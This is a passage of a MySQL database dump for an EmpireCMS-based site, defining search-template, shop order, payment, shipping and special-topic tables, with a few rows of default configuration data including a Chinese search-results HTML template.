/*!40000 ALTER TABLE `libang_enewssearchall_load` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewssearchtemp`
--

DROP TABLE IF EXISTS `libang_enewssearchtemp`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewssearchtemp` (
  `tempid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `tempname` varchar(60) NOT NULL DEFAULT '',
  `temptext` mediumtext NOT NULL,
  `subnews` smallint(6) NOT NULL DEFAULT '0',
  `isdefault` tinyint(1) NOT NULL DEFAULT '0',
  `listvar` text NOT NULL,
  `rownum` smallint(6) NOT NULL DEFAULT '0',
  `modid` smallint(6) NOT NULL DEFAULT '0',
  `showdate` varchar(50) NOT NULL DEFAULT '',
  `subtitle` smallint(6) NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `docode` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`tempid`),
  KEY `classid` (`classid`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewssearchtemp`
--

LOCK TABLES `libang_enewssearchtemp` WRITE;
/*!40000 ALTER TABLE `libang_enewssearchtemp` DISABLE KEYS */;
INSERT INTO `libang_enewssearchtemp` VALUES (1,'默认搜索模板','<!DOCTYPE html PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n<head>\r\n<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" />\r\n<title>[!--keyboard--] 搜索结果 - Powered by EmpireCMS</title>\r\n<link href=\\\"[!--news.url--]skin/default/css/style.css\\\" rel=\\\"stylesheet\\\" type=\\\"text/css\\\" />\r\n<script type=\\\"text/javascript\\\" src=\\\"[!--news.url--]skin/default/js/tabs.js\\\"></script>\r\n<style type=\\\"text/css\\\">\r\n<!--\r\n.r {\r\ndisplay:inline;\r\nfont-weight:normal;\r\nmargin:0;\r\nfont-size:16px;\r\nmargin-top:10px;\r\n}\r\n.a{color:green}\r\n.fl{color:#77c}\r\n-->\r\n</style>\r\n</head>\r\n<body class=\\\"listpage\\\">\r\n[!--temp.dtheader--]\r\n<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"10\\\" cellpadding=\\\"0\\\">\r\n	<tr valign=\\\"top\\\">\r\n		<td class=\\\"list_content\\\"><table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"position\\\">\r\n				<tr>\r\n					<td>现在的位置：<a href=\\\"[!--news.url--]\\\" class=\\\"classlinkclass\\\">首页</a>&nbsp;>&nbsp;<a href=\\\"[!--news.url--]search/\\\" class=\\\"classlinkclass\\\">高级搜索</a>&nbsp;>&nbsp;搜索结果</td>\r\n				</tr>\r\n			</table>\r\n			<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"box\\\">\r\n				<tr>\r\n					<td><form action=\\\'../../search/index.php\\\' method=\\\"post\\\" name=\\\"search_news\\\" id=\\\"search_news\\\">\r\n							<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"6\\\" cellpadding=\\\"0\\\">\r\n								<input type=\\\"hidden\\\" name=\\\"show\\\" value=\\\"title\\\" />\r\n								<tr>\r\n									<td height=\\\"32\\\">关键字：\r\n										<input name=\\\"keyboard\\\" type=\\\"text\\\" id=\\\"keyboard\\\" value=\\\"[!--keyboard--]\\\" size=\\\"42\\\" />\r\n										<input type=\\\"submit\\\" name=\\\"Submit22\\\" value=\\\"搜索\\\" />\r\n										&nbsp;\r\n										<input type=\\\"button\\\" name=\\\"Submit\\\" value=\\\"高级搜索\\\" onclick=\\\"self.location.href=\\\'../../../search/\\\'\\\" />\r\n										(多个关键字请用&quot;空格&quot;隔开) </td>\r\n								</tr>\r\n							</table>\r\n						</form>\r\n						<table width=\\\"100%\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"6\\\">\r\n							<tr>\r\n								<td>系统搜索到约有<strong>[!--ecms.num--]</strong>项符合<strong>[!--keyboard--]</strong>的查询结果</td>\r\n							</tr>\r\n						</table>\r\n						[!--empirenews.listtemp--]\r\n						<!--list.var1-->\r\n						[!--empirenews.listtemp--]\r\n						<table width=\\\"100%\\\" border=\\\"0\\\" cellspacing=\\\"0\\\" cellpadding=\\\"0\\\" class=\\\"list_page\\\">\r\n							<tr>\r\n								<td>[!--show.page--]</td>\r\n							</tr>\r\n						</table></td>\r\n				</tr>\r\n			</table></td>\r\n	</tr>\r\n</table>\r\n[!--temp.footer--]\r\n</body>\r\n</html>',180,1,'<h2 class=\\\"r\\\"><span>[!--no.num--].</span> <a class=\\\"l\\\" href=\\\"[!--titleurl--]\\\" target=\\\"_blank\\\">[!--title--]</a></h2>\r\n<table width=\\\"80%\\\" border=\\\"0\\\" cellpadding=\\\"0\\\" cellspacing=\\\"0\\\">\r\n	<tbody>\r\n		<tr>\r\n			<td>[!--smalltext--]</td>\r\n		</tr>\r\n		<tr>\r\n			<td><span class=\\\"a\\\">[!--titleurl--] - [!--newstime--]</span> - <a class=\\\"fl\\\" href=\\\"[!--this.classlink--]\\\" target=\\\"_blank\\\">[!--this.classname--]</a></td>\r\n		</tr>\r\n		<tr>\r\n			<td>&nbsp;</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n',1,1,'Y-m-d',0,0,0);
/*!40000 ALTER TABLE `libang_enewssearchtemp` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewssearchtempclass`
--

DROP TABLE IF EXISTS `libang_enewssearchtempclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewssearchtempclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewssearchtempclass`
--

LOCK TABLES `libang_enewssearchtempclass` WRITE;
/*!40000 ALTER TABLE `libang_enewssearchtempclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewssearchtempclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsshop_address`
--

DROP TABLE IF EXISTS `libang_enewsshop_address`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsshop_address` (
  `addressid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `addressname` char(50) NOT NULL DEFAULT '',
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `truename` char(20) NOT NULL DEFAULT '',
  `oicq` char(20) NOT NULL DEFAULT '',
  `msn` char(60) NOT NULL DEFAULT '',
  `email` char(60) NOT NULL DEFAULT '',
  `address` char(255) NOT NULL DEFAULT '',
  `zip` char(8) NOT NULL DEFAULT '',
  `mycall` char(30) NOT NULL DEFAULT '',
  `phone` char(30) NOT NULL DEFAULT '',
  `signbuild` char(100) NOT NULL DEFAULT '',
  `besttime` char(120) NOT NULL DEFAULT '',
  `isdefault` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`addressid`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsshop_address`
--

LOCK TABLES `libang_enewsshop_address` WRITE;
/*!40000 ALTER TABLE `libang_enewsshop_address` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsshop_address` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsshop_ddlog`
--

DROP TABLE IF EXISTS `libang_enewsshop_ddlog`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsshop_ddlog` (
  `logid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `ddid` int(10) unsigned NOT NULL DEFAULT '0',
  `userid` int(10) unsigned NOT NULL DEFAULT '0',
  `username` varchar(30) NOT NULL DEFAULT '',
  `ecms` varchar(30) NOT NULL DEFAULT '',
  `bz` varchar(255) NOT NULL DEFAULT '',
  `addbz` varchar(255) NOT NULL DEFAULT '',
  `logtime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`logid`),
  KEY `ddid` (`ddid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsshop_ddlog`
--

LOCK TABLES `libang_enewsshop_ddlog` WRITE;
/*!40000 ALTER TABLE `libang_enewsshop_ddlog` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsshop_ddlog` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsshop_precode`
--

DROP TABLE IF EXISTS `libang_enewsshop_precode`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsshop_precode` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prename` varchar(30) NOT NULL DEFAULT '',
  `precode` varchar(36) NOT NULL DEFAULT '',
  `premoney` int(10) unsigned NOT NULL DEFAULT '0',
  `pretype` tinyint(1) NOT NULL DEFAULT '0',
  `reuse` tinyint(1) NOT NULL DEFAULT '0',
  `addtime` int(10) unsigned NOT NULL DEFAULT '0',
  `endtime` int(10) unsigned NOT NULL DEFAULT '0',
  `groupid` varchar(255) NOT NULL DEFAULT '',
  `classid` text NOT NULL,
  `musttotal` int(10) unsigned NOT NULL DEFAULT '0',
  `usenum` int(11) NOT NULL DEFAULT '0',
  `haveusenum` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `precode` (`precode`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsshop_precode`
--

LOCK TABLES `libang_enewsshop_precode` WRITE;
/*!40000 ALTER TABLE `libang_enewsshop_precode` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsshop_precode` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsshop_set`
--

DROP TABLE IF EXISTS `libang_enewsshop_set`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsshop_set` (
  `id` tinyint(3) unsigned NOT NULL AUTO_INCREMENT,
  `shopddgroupid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `buycarnum` smallint(5) unsigned NOT NULL DEFAULT '0',
  `havefp` tinyint(1) NOT NULL DEFAULT '0',
  `fpnum` smallint(5) unsigned NOT NULL DEFAULT '0',
  `fpname` text NOT NULL,
  `ddmust` text NOT NULL,
  `haveatt` tinyint(1) NOT NULL DEFAULT '0',
  `shoptbs` varchar(255) NOT NULL DEFAULT '',
  `buystep` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `shoppsmust` tinyint(1) NOT NULL DEFAULT '0',
  `shoppayfsmust` tinyint(1) NOT NULL DEFAULT '0',
  `dddeltime` smallint(5) unsigned NOT NULL DEFAULT '0',
  `cutnumtype` tinyint(1) NOT NULL DEFAULT '0',
  `cutnumtime` int(10) unsigned NOT NULL DEFAULT '0',
  `freepstotal` int(10) unsigned NOT NULL DEFAULT '0',
  `singlenum` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsshop_set`
--

LOCK TABLES `libang_enewsshop_set` WRITE;
/*!40000 ALTER TABLE `libang_enewsshop_set` DISABLE KEYS */;
INSERT INTO `libang_enewsshop_set` VALUES (1,0,0,0,10,'商品名称\r\n办公用品\r\n日用品',',truename,mycall,address,',0,',shop,',0,1,1,0,0,120,0,0);
/*!40000 ALTER TABLE `libang_enewsshop_set` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsshopdd`
--

DROP TABLE IF EXISTS `libang_enewsshopdd`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsshopdd` (
  `ddid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `ddno` varchar(30) NOT NULL DEFAULT '',
  `ddtime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `userid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `username` varchar(30) NOT NULL DEFAULT '',
  `outproduct` tinyint(1) NOT NULL DEFAULT '0',
  `haveprice` tinyint(1) NOT NULL DEFAULT '0',
  `checked` tinyint(1) NOT NULL DEFAULT '0',
  `truename` varchar(20) NOT NULL DEFAULT '',
  `oicq` varchar(25) NOT NULL DEFAULT '',
  `msn` varchar(120) NOT NULL DEFAULT '',
  `email` varchar(120) NOT NULL DEFAULT '',
  `mycall` varchar(30) NOT NULL DEFAULT '',
  `phone` varchar(30) NOT NULL DEFAULT '',
  `address` varchar(255) NOT NULL DEFAULT '',
  `zip` varchar(8) NOT NULL DEFAULT '',
  `psid` smallint(6) NOT NULL DEFAULT '0',
  `psname` varchar(60) NOT NULL DEFAULT '',
  `pstotal` float(11,2) NOT NULL DEFAULT '0.00',
  `alltotal` float(11,2) NOT NULL DEFAULT '0.00',
  `payfsid` smallint(6) NOT NULL DEFAULT '0',
  `payfsname` varchar(60) NOT NULL DEFAULT '',
  `payby` tinyint(4) NOT NULL DEFAULT '0',
  `alltotalfen` float(11,2) NOT NULL DEFAULT '0.00',
  `fp` tinyint(1) NOT NULL DEFAULT '0',
  `fptt` varchar(255) NOT NULL DEFAULT '',
  `fptotal` float(11,2) NOT NULL DEFAULT '0.00',
  `fpname` varchar(50) NOT NULL DEFAULT '',
  `userip` varchar(20) NOT NULL DEFAULT '',
  `signbuild` varchar(100) NOT NULL DEFAULT '',
  `besttime` varchar(120) NOT NULL DEFAULT '',
  `pretotal` float(11,2) NOT NULL DEFAULT '0.00',
  `ddtruetime` int(10) unsigned NOT NULL DEFAULT '0',
  `havecutnum` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`ddid`),
  KEY `ddno` (`ddno`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsshopdd`
--

LOCK TABLES `libang_enewsshopdd` WRITE;
/*!40000 ALTER TABLE `libang_enewsshopdd` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsshopdd` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsshopdd_add`
--

DROP TABLE IF EXISTS `libang_enewsshopdd_add`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsshopdd_add` (
  `ddid` int(10) unsigned NOT NULL DEFAULT '0',
  `buycar` mediumtext NOT NULL,
  `bz` text NOT NULL,
  `retext` text NOT NULL,
  PRIMARY KEY (`ddid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsshopdd_add`
--

LOCK TABLES `libang_enewsshopdd_add` WRITE;
/*!40000 ALTER TABLE `libang_enewsshopdd_add` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsshopdd_add` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsshoppayfs`
--

DROP TABLE IF EXISTS `libang_enewsshoppayfs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsshoppayfs` (
  `payid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `payname` varchar(60) NOT NULL DEFAULT '',
  `payurl` varchar(255) NOT NULL DEFAULT '',
  `paysay` text NOT NULL,
  `userpay` tinyint(1) NOT NULL DEFAULT '0',
  `userfen` tinyint(1) NOT NULL DEFAULT '0',
  `isclose` tinyint(1) NOT NULL DEFAULT '0',
  `isdefault` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`payid`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsshoppayfs`
--

LOCK TABLES `libang_enewsshoppayfs` WRITE;
/*!40000 ALTER TABLE `libang_enewsshoppayfs` DISABLE KEYS */;
INSERT INTO `libang_enewsshoppayfs` VALUES (1,'邮政汇款','','邮政汇款地址:******',0,0,0,0),(2,'银行转帐','','银行转帐帐号:******',0,0,0,0),(3,'网银支付','/e/payapi/ShopPay.php?paytype=alipay','<p>网银支付</p>',0,0,0,1),(4,'预付款支付','','预付款支付',1,0,0,0),(5,'货到付款(或上门收款)','','货到付款(或上门收款)说明',0,0,0,0),(6,'点数购买','','点数购买',0,1,0,0);
/*!40000 ALTER TABLE `libang_enewsshoppayfs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsshopps`
--

DROP TABLE IF EXISTS `libang_enewsshopps`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsshopps` (
  `pid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `pname` varchar(60) NOT NULL DEFAULT '',
  `price` float(11,2) NOT NULL DEFAULT '0.00',
  `otherprice` text NOT NULL,
  `psay` text NOT NULL,
  `isclose` tinyint(1) NOT NULL DEFAULT '0',
  `isdefault` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`pid`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsshopps`
--

LOCK TABLES `libang_enewsshopps` WRITE;
/*!40000 ALTER TABLE `libang_enewsshopps` DISABLE KEYS */;
INSERT INTO `libang_enewsshopps` VALUES (1,'送货上门',10.00,'','送货上门',0,0),(2,'特快专递（EMS）',25.00,'','特快专递（EMS）',0,0),(3,'普通邮递',5.00,'','普通邮递',0,1),(4,'邮局快邮',12.00,'','邮局快邮',0,0);
/*!40000 ALTER TABLE `libang_enewsshopps` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewssp`
--

DROP TABLE IF EXISTS `libang_enewssp`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewssp` (
  `spid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `spname` varchar(30) NOT NULL DEFAULT '',
  `varname` varchar(30) NOT NULL DEFAULT '',
  `sppic` varchar(255) NOT NULL DEFAULT '',
  `spsay` varchar(255) NOT NULL DEFAULT '',
  `sptype` tinyint(1) NOT NULL DEFAULT '0',
  `cid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `tempid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `maxnum` int(11) NOT NULL DEFAULT '0',
  `sptime` int(10) unsigned NOT NULL DEFAULT '0',
  `groupid` text NOT NULL,
  `userclass` text NOT NULL,
  `username` text NOT NULL,
  `isclose` tinyint(1) NOT NULL DEFAULT '0',
  `cladd` tinyint(1) NOT NULL DEFAULT '0',
  `refile` tinyint(1) NOT NULL DEFAULT '0',
  `spfile` varchar(255) NOT NULL DEFAULT '',
  `spfileline` smallint(6) NOT NULL DEFAULT '0',
  `spfilesub` smallint(6) NOT NULL DEFAULT '0',
  PRIMARY KEY (`spid`),
  UNIQUE KEY `varname` (`varname`),
  KEY `refile` (`refile`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewssp`
--

LOCK TABLES `libang_enewssp` WRITE;
/*!40000 ALTER TABLE `libang_enewssp` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewssp` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewssp_1`
--

DROP TABLE IF EXISTS `libang_enewssp_1`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewssp_1` (
  `sid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `spid` int(10) unsigned NOT NULL DEFAULT '0',
  `title` varchar(200) NOT NULL DEFAULT '',
  `titlepic` varchar(200) NOT NULL DEFAULT '',
  `bigpic` varchar(200) NOT NULL DEFAULT '',
  `titleurl` varchar(200) NOT NULL DEFAULT '',
  `smalltext` varchar(255) NOT NULL DEFAULT '',
  `titlefont` varchar(20) NOT NULL DEFAULT '',
  `newstime` int(10) unsigned NOT NULL DEFAULT '0',
  `titlepre` varchar(30) NOT NULL DEFAULT '',
  `titlenext` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`sid`),
  KEY `spid` (`spid`),
  KEY `newstime` (`newstime`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewssp_1`
--

LOCK TABLES `libang_enewssp_1` WRITE;
/*!40000 ALTER TABLE `libang_enewssp_1` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewssp_1` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewssp_2`
--

DROP TABLE IF EXISTS `libang_enewssp_2`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewssp_2` (
  `sid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `spid` int(10) unsigned NOT NULL DEFAULT '0',
  `classid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  `newstime` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`sid`),
  KEY `spid` (`spid`),
  KEY `newstime` (`newstime`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewssp_2`
--

LOCK TABLES `libang_enewssp_2` WRITE;
/*!40000 ALTER TABLE `libang_enewssp_2` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewssp_2` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewssp_3`
--

DROP TABLE IF EXISTS `libang_enewssp_3`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewssp_3` (
  `sid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `spid` int(10) unsigned NOT NULL DEFAULT '0',
  `sptext` mediumtext NOT NULL,
  PRIMARY KEY (`sid`),
  UNIQUE KEY `spid` (`spid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewssp_3`
--

LOCK TABLES `libang_enewssp_3` WRITE;
/*!40000 ALTER TABLE `libang_enewssp_3` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewssp_3` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewssp_3_bak`
--

DROP TABLE IF EXISTS `libang_enewssp_3_bak`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewssp_3_bak` (
  `bid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `sid` int(10) unsigned NOT NULL DEFAULT '0',
  `spid` int(10) unsigned NOT NULL DEFAULT '0',
  `sptext` mediumtext NOT NULL,
  `lastuser` varchar(30) NOT NULL DEFAULT '',
  `lasttime` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`bid`),
  KEY `sid` (`sid`),
  KEY `spid` (`spid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewssp_3_bak`
--

LOCK TABLES `libang_enewssp_3_bak` WRITE;
/*!40000 ALTER TABLE `libang_enewssp_3_bak` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewssp_3_bak` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsspacestyle`
--

DROP TABLE IF EXISTS `libang_enewsspacestyle`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsspacestyle` (
  `styleid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `stylename` varchar(30) NOT NULL DEFAULT '',
  `stylepic` varchar(255) NOT NULL DEFAULT '',
  `stylesay` varchar(255) NOT NULL DEFAULT '',
  `stylepath` varchar(30) NOT NULL DEFAULT '0',
  `isdefault` tinyint(1) NOT NULL DEFAULT '0',
  `membergroup` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`styleid`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsspacestyle`
--

LOCK TABLES `libang_enewsspacestyle` WRITE;
/*!40000 ALTER TABLE `libang_enewsspacestyle` DISABLE KEYS */;
INSERT INTO `libang_enewsspacestyle` VALUES (1,'默认个人空间模板','','默认个人空间模板','default',1,',1,2,'),(2,'默认企业空间模板','','默认企业空间模板','comdefault',0,',3,4,');
/*!40000 ALTER TABLE `libang_enewsspacestyle` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewsspclass`
--

DROP TABLE IF EXISTS `libang_enewsspclass`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewsspclass` (
  `classid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `classname` varchar(30) NOT NULL DEFAULT '',
  `classsay` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`classid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewsspclass`
--

LOCK TABLES `libang_enewsspclass` WRITE;
/*!40000 ALTER TABLE `libang_enewsspclass` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewsspclass` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewssql`
--

DROP TABLE IF EXISTS `libang_enewssql`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewssql` (
  `id` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `sqlname` varchar(60) NOT NULL DEFAULT '',
  `sqltext` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewssql`
--

LOCK TABLES `libang_enewssql` WRITE;
/*!40000 ALTER TABLE `libang_enewssql` DISABLE KEYS */;
/*!40000 ALTER TABLE `libang_enewssql` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewstable`
--

DROP TABLE IF EXISTS `libang_enewstable`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewstable` (
  `tid` smallint(5) unsigned NOT NULL AUTO_INCREMENT,
  `tbname` varchar(60) NOT NULL DEFAULT '',
  `tname` varchar(60) NOT NULL DEFAULT '',
  `tsay` text NOT NULL,
  `isdefault` tinyint(1) NOT NULL DEFAULT '0',
  `datatbs` text NOT NULL,
  `deftb` varchar(6) NOT NULL DEFAULT '',
  `yhid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `mid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `intb` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`tid`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `libang_enewstable`
--

LOCK TABLES `libang_enewstable` WRITE;
/*!40000 ALTER TABLE `libang_enewstable` DISABLE KEYS */;
INSERT INTO `libang_enewstable` VALUES (1,'news','新闻系统数据表','新闻系统数据表',1,',1,','1',0,1,0),(7,'article','文章系统数据表','文章系统数据表(内容存文本)',0,',1,','1',0,7,0),(8,'info','分类信息数据表','分类信息数据表',0,',1,','1',0,8,0);
/*!40000 ALTER TABLE `libang_enewstable` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `libang_enewstags`
--

DROP TABLE IF EXISTS `libang_enewstags`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `libang_enewstags` (
  `tagid` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `tagname` char(20) NOT NULL DEFAULT '',
